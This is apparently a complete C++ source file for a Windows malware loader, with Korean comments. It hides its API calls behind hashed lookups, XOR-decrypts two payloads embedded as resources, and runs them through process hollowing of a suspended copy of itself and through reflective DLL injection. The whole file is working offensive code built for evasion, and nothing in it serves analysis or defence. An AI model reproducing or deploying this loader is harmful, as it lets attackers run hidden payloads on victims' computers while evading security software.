#include <windows.h>
#include <winternl.h>
#include <vector>
#include <iostream>

// [오타 수정] IMAGE_BASE_RELocation -> IMAGE_BASE_RELOCATION
#ifndef IMAGE_SIZEOF_BASE_RELOCATION
#define IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))
#endif

// 리소스 ID 정의
#define EXE_PAYLOAD 101
#define DLL_PAYLOAD 102

// --- API 해시 정의부 ---
constexpr DWORD calculate_hash(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash >> 13) | (hash << 19); // ROR 13
        hash += *str;
        str++;
    }
    return hash;
}

namespace API_HASHES {
    // Kernel32.dll
    constexpr DWORD LoadLibraryA_H = calculate_hash("LoadLibraryA");
    constexpr DWORD GetProcAddress_H = calculate_hash("GetProcAddress");
    constexpr DWORD GetModuleHandleA_H = calculate_hash("GetModuleHandleA");
    constexpr DWORD GetModuleFileNameA_H = calculate_hash("GetModuleFileNameA");
    constexpr DWORD CreateProcessA_H = calculate_hash("CreateProcessA");
    constexpr DWORD GetThreadContext_H = calculate_hash("GetThreadContext");
    constexpr DWORD VirtualAllocEx_H = calculate_hash("VirtualAllocEx");
    constexpr DWORD WriteProcessMemory_H = calculate_hash("WriteProcessMemory");
    constexpr DWORD SetThreadContext_H = calculate_hash("SetThreadContext");
    constexpr DWORD ResumeThread_H = calculate_hash("ResumeThread");
    constexpr DWORD CloseHandle_H = calculate_hash("CloseHandle");
    constexpr DWORD TerminateProcess_H = calculate_hash("TerminateProcess");
    constexpr DWORD CreateRemoteThread_H = calculate_hash("CreateRemoteThread");
    constexpr DWORD WaitForSingleObject_H = calculate_hash("WaitForSingleObject");
}

// --- API 함수 포인터 타입 정의 ---
typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);
typedef FARPROC(WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* GetModuleHandleA_t)(LPCSTR);
typedef DWORD(WINAPI* GetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* GetThreadContext_t)(HANDLE, LPCONTEXT);
typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* SetThreadContext_t)(HANDLE, const CONTEXT*);
typedef DWORD(WINAPI* ResumeThread_t)(HANDLE);
typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
typedef BOOL(WINAPI* TerminateProcess_t)(HANDLE, UINT);
typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL(WINAPI* DllMain_t)(HINSTANCE, DWORD, LPVOID);


// --- 동적으로 가져올 API 함수 포인터 ---
struct {
    GetModuleHandleA_t GetModuleHandleA;
    GetProcAddress_t GetProcAddress;
    LoadLibraryA_t LoadLibraryA;
    GetModuleFileNameA_t GetModuleFileNameA;
    CreateProcessA_t CreateProcessA;
    GetThreadContext_t GetThreadContext;
    VirtualAllocEx_t VirtualAllocEx;
    WriteProcessMemory_t WriteProcessMemory;
    SetThreadContext_t SetThreadContext;
    ResumeThread_t ResumeThread;
    CloseHandle_t CloseHandle;
    TerminateProcess_t TerminateProcess;
    CreateRemoteThread_t CreateRemoteThread;
    WaitForSingleObject_t WaitForSingleObject;
} API;

const char key[] = "mysecretkey";

// --- PEB/EAT 파싱 및 헬퍼 함수 ---
int wcsicmp_custom(const wchar_t* s1, const wchar_t* s2) {
    while (towlower(*s1) == towlower(*s2)) {
        if (*s1 == 0) return 0;
        s1++;
        s2++;
    }
    return towlower(*s1) - towlower(*s2);
}

FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwHash) {
    if (!hModule) return NULL;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* pNameArray = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    DWORD* pFuncArray = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    WORD* pOrdArray = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; ++i) {
        char* pCurrentFuncName = (char*)((BYTE*)hModule + pNameArray[i]);
        if (calculate_hash(pCurrentFuncName) == dwHash) {
            WORD ordinal = pOrdArray[i];
            DWORD funcRVA = pFuncArray[ordinal];
            return (FARPROC)((BYTE*)hModule + funcRVA);
        }
    }
    return NULL;
}

void xor_decrypt(unsigned char* data, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key[i % (sizeof(key) - 1)];
    }
}

std::vector<unsigned char> LoadPayloadFromResource(HMODULE hCurrent, int resourceId) {
    HRSRC hRes = FindResourceA(hCurrent, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
    if (!hRes) return {};
    DWORD dwSize = SizeofResource(hCurrent, hRes);
    HGLOBAL hResLoad = LoadResource(hCurrent, hRes);
    LPVOID pResLock = LockResource(hResLoad);
    std::vector<unsigned char> payload(dwSize);
    memcpy(payload.data(), pResLock, dwSize);
    return payload;
}


// --- 리플렉티브 DLL 인젝션 로직 ---
typedef struct {
    LPVOID ImageBase;
    LoadLibraryA_t fnLoadLibraryA;
    GetProcAddress_t fnGetProcAddress;
} LOADER_PARAMS, * PLOADER_PARAMS;

DWORD WINAPI LoaderStub(LPVOID lpParameter) {
    LOADER_PARAMS* params = (LOADER_PARAMS*)lpParameter;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)params->ImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)params->ImageBase + pDosHeader->e_lfanew);

    // IAT 처리
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)params->ImageBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (pImportDesc->Name) {
            char* szModuleName = (char*)((LPBYTE)params->ImageBase + pImportDesc->Name);
            HMODULE hModule = params->fnLoadLibraryA(szModuleName);
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((LPBYTE)params->ImageBase + pImportDesc->FirstThunk);
            PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)((LPBYTE)params->ImageBase + pImportDesc->OriginalFirstThunk);
            while (pOrigThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk->u1.Ordinal)) {
                    pThunk->u1.Function = (ULONGLONG)params->fnGetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pOrigThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)params->ImageBase + pOrigThunk->u1.AddressOfData);
                    pThunk->u1.Function = (ULONGLONG)params->fnGetProcAddress(hModule, pImportByName->Name);
                }
                pThunk++;
                pOrigThunk++;
            }
            pImportDesc++;
        }
    }

    // 재배치 처리
    ULONGLONG delta = (ULONGLONG)((LPBYTE)params->ImageBase - pNtHeaders->OptionalHeader.ImageBase);
    if (delta != 0 && pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)params->ImageBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (pBaseReloc->VirtualAddress) {
            USHORT* relocInfo = (USHORT*)((LPBYTE)pBaseReloc + IMAGE_SIZEOF_BASE_RELOCATION);
            for (DWORD i = 0; i < (pBaseReloc->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / sizeof(USHORT); ++i) {
                int type = relocInfo[i] >> 12;
                int offset = relocInfo[i] & 0xFFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* pPatch = (ULONGLONG*)((LPBYTE)params->ImageBase + pBaseReloc->VirtualAddress + offset);
                    *pPatch += delta;
                }
            }
            // [오타 수정] IMAGE_BASE_RELocation -> IMAGE_BASE_RELOCATION
            pBaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)pBaseReloc + pBaseReloc->SizeOfBlock);
        }
    }

    // DllMain 호출
    if (pNtHeaders->OptionalHeader.AddressOfEntryPoint) {
        DllMain_t DllMain = (DllMain_t)((LPBYTE)params->ImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        DllMain((HINSTANCE)params->ImageBase, DLL_PROCESS_ATTACH, NULL);
    }

    return 0;
}

void ReflectiveInject(std::vector<unsigned char>& dllPayload) {
    HANDLE hProcess = GetCurrentProcess();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllPayload.data();
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(dllPayload.data() + pDosHeader->e_lfanew);

    LPVOID pRemoteDllBase = API.VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteDllBase) return;

    API.WriteProcessMemory(hProcess, pRemoteDllBase, dllPayload.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)dllPayload.data() + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        API.WriteProcessMemory(hProcess, (LPVOID)((LPBYTE)pRemoteDllBase + pSectionHeader->VirtualAddress), (LPVOID)(dllPayload.data() + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
    }

    LOADER_PARAMS params;
    params.ImageBase = pRemoteDllBase;
    params.fnLoadLibraryA = API.LoadLibraryA;
    params.fnGetProcAddress = API.GetProcAddress;

    LPVOID pRemoteParams = API.VirtualAllocEx(hProcess, NULL, sizeof(LOADER_PARAMS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteParams) return;

    API.WriteProcessMemory(hProcess, pRemoteParams, &params, sizeof(LOADER_PARAMS), NULL);

    HANDLE hThread = API.CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoaderStub, pRemoteParams, 0, NULL);
    if (hThread) {
        API.CloseHandle(hThread);
    }
}


// --- 프로그램의 실제 시작점 ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HMODULE hKernel32 = NULL;
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    LIST_ENTRY* head = &pPeb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current = head->Flink;

    while (current != head) {
        LDR_DATA_TABLE_ENTRY* pLdrEntry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pLdrEntry->FullDllName.Buffer) {
            const wchar_t* dllName = L"kernel32.dll";
            size_t nameLen = wcslen(dllName);
            size_t fullPathLen = wcslen(pLdrEntry->FullDllName.Buffer);
            if (fullPathLen >= nameLen && wcsicmp_custom(pLdrEntry->FullDllName.Buffer + fullPathLen - nameLen, dllName) == 0) {
                hKernel32 = (HMODULE)pLdrEntry->DllBase;
                break;
            }
        }
        current = current->Flink;
    }
    if (!hKernel32) return 1;

    API.GetProcAddress = (GetProcAddress_t)GetProcAddressByHash(hKernel32, API_HASHES::GetProcAddress_H);
    if (!API.GetProcAddress) return 1;

    API.LoadLibraryA = (LoadLibraryA_t)GetProcAddressByHash(hKernel32, API_HASHES::LoadLibraryA_H);
    API.GetModuleHandleA = (GetModuleHandleA_t)GetProcAddressByHash(hKernel32, API_HASHES::GetModuleHandleA_H);
    API.GetModuleFileNameA = (GetModuleFileNameA_t)GetProcAddressByHash(hKernel32, API_HASHES::GetModuleFileNameA_H);
    API.CreateProcessA = (CreateProcessA_t)GetProcAddressByHash(hKernel32, API_HASHES::CreateProcessA_H);
    API.GetThreadContext = (GetThreadContext_t)GetProcAddressByHash(hKernel32, API_HASHES::GetThreadContext_H);
    API.VirtualAllocEx = (VirtualAllocEx_t)GetProcAddressByHash(hKernel32, API_HASHES::VirtualAllocEx_H);
    API.WriteProcessMemory = (WriteProcessMemory_t)GetProcAddressByHash(hKernel32, API_HASHES::WriteProcessMemory_H);
    API.SetThreadContext = (SetThreadContext_t)GetProcAddressByHash(hKernel32, API_HASHES::SetThreadContext_H);
    API.ResumeThread = (ResumeThread_t)GetProcAddressByHash(hKernel32, API_HASHES::ResumeThread_H);
    API.CloseHandle = (CloseHandle_t)GetProcAddressByHash(hKernel32, API_HASHES::CloseHandle_H);
    API.TerminateProcess = (TerminateProcess_t)GetProcAddressByHash(hKernel32, API_HASHES::TerminateProcess_H);
    API.CreateRemoteThread = (CreateRemoteThread_t)GetProcAddressByHash(hKernel32, API_HASHES::CreateRemoteThread_H);
    API.WaitForSingleObject = (WaitForSingleObject_t)GetProcAddressByHash(hKernel32, API_HASHES::WaitForSingleObject_H);

    HMODULE hSelf = API.GetModuleHandleA(NULL);
    std::vector<unsigned char> exe_payload = LoadPayloadFromResource(hSelf, EXE_PAYLOAD);
    std::vector<unsigned char> dll_payload = LoadPayloadFromResource(hSelf, DLL_PAYLOAD);

    if (exe_payload.empty() || dll_payload.empty()) return 1;

    xor_decrypt(exe_payload.data(), exe_payload.size());
    xor_decrypt(dll_payload.data(), dll_payload.size());

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));

    // ====[ 파트 1: 프로세스 할로잉 ]====
    {
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)exe_payload.data();
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)exe_payload.data() + pDosHeader->e_lfanew);
        STARTUPINFOA si;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        char currentPath[MAX_PATH];
        API.GetModuleFileNameA(NULL, currentPath, MAX_PATH);

        if (API.CreateProcessA(NULL, currentPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            CONTEXT context;
            context.ContextFlags = CONTEXT_FULL;
            API.GetThreadContext(pi.hThread, &context);
            LPVOID imageBase = API.VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!imageBase) {
                imageBase = API.VirtualAllocEx(pi.hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            }
            if (imageBase) {
                ULONGLONG delta = (ULONGLONG)((LPBYTE)imageBase - pNtHeaders->OptionalHeader.ImageBase);
                if (delta != 0 && pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
                    PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)exe_payload.data() + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
                    while (pBaseReloc->VirtualAddress) {
                        USHORT* relocInfo = (USHORT*)((LPBYTE)pBaseReloc + IMAGE_SIZEOF_BASE_RELOCATION);
                        for (DWORD i = 0; i < (pBaseReloc->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / sizeof(USHORT); ++i) {
                            int type = relocInfo[i] >> 12;
                            int offset = relocInfo[i] & 0xFFF;
                            if (type == IMAGE_REL_BASED_DIR64) {
                                ULONGLONG* pPatch = (ULONGLONG*)((LPBYTE)exe_payload.data() + pBaseReloc->VirtualAddress + offset);
                                *pPatch += delta;
                            }
                        }
                        // [오타 수정] IMAGE_BASE_RELocation -> IMAGE_BASE_RELOCATION
                        pBaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)pBaseReloc + pBaseReloc->SizeOfBlock);
                    }
                }
                API.WriteProcessMemory(pi.hProcess, imageBase, exe_payload.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
                for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
                    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)exe_payload.data() + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
                    API.WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)imageBase + pSectionHeader->VirtualAddress), (LPVOID)((LPBYTE)exe_payload.data() + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
                }
#ifdef _WIN64
                context.Rip = (ULONGLONG)((LPBYTE)imageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
                API.WriteProcessMemory(pi.hProcess, (LPVOID)(context.Rdx + 16), &imageBase, sizeof(LPVOID), NULL);
#else
                context.Eip = (DWORD)((LPBYTE)imageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
                API.WriteProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), &imageBase, sizeof(LPVOID), NULL);
#endif
                API.SetThreadContext(pi.hThread, &context);
                API.ResumeThread(pi.hThread);
            }
            else {
                API.TerminateProcess(pi.hProcess, 1);
            }
            API.CloseHandle(pi.hThread);
        }
    }

    // ====[ 파트 2: 리플렉티브 인젝션 ]====
    {
        ReflectiveInject(dll_payload);
    }

    // ====[ 파트 3: 자식 프로세스 대기 ]====
    if (pi.hProcess != NULL) {
        API.WaitForSingleObject(pi.hProcess, INFINITE);
        API.CloseHandle(pi.hProcess);
    }

    return 0;
}